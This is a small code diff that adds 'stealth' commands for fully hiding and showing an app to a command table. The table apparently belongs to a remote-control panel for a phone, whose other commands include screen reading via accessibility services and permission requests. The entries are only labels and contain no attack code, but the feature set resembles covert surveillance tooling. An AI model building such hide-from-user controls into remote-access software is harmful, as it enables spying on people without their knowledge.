@@ -112,6 +112,9 @@ const COMMANDS = {
     request_storage_permission:{ category: 'permissions',  label: 'Request Storage Perm',  icon: '📂' },
     screen_off:                { category: 'screen_ctrl',  label: 'Screen Off',            icon: '🌑' },
     open_task_manager:         { category: 'screen_ctrl',  label: 'Task Manager',          icon: '🗂️' },
+    // Stealth
+    fully_hide_app:            { category: 'stealth',     label: 'Hide App (Full)',       icon: '🔒' },
+    fully_show_app:            { category: 'stealth',     label: 'Show App (Full)',       icon: '🔓' },
     // Screen Reader (Accessibility)
     read_screen:               { category: 'screen_reader',label: 'Read Screen',           icon: '📺' },
     find_by_text:              { category: 'screen_reader',label: 'Find By Text',          icon: '🔍' },
